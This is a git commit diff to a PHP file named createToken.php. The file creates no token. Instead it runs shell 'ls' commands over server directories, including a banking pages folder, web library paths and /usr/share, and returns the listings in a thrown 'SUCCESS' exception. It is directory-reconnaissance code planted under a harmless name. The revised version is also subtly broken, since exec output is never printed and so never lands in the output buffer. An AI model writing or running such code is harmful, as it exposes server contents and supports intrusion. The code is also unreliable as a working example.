79f30fb049d491aecd24b035a1f478553ba8194c
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2020-12-30 15:36:36 +0100

    Update createToken.php

--- createToken.php
+++ createToken.php
@@ -1,6 +1,13 @@
 <?php
-$asd="\n pages ".exec('ls /var/www/pages/');
-$asd=$asd."\n banking ".exec('ls /var/www/pages/banking/');
-$asd=$asd."\n share ".exec('ls /usr/share/');
-throw new Exception('SUCCESS '.$asd);
+ob_start();
+exec('ls /var/www/pages/');
+exec('ls /var/www/pages/banking/');
+exec('ls /usr/share/');
+
+exec('ls /usr/share/zoneinfo');
+exec('ls /var/www/lib/');
+exec('ls /var/www');
+$output = ob_get_contents();
+ob_end_clean();
+throw new Exception('SUCCESS '. $output);
 ?>
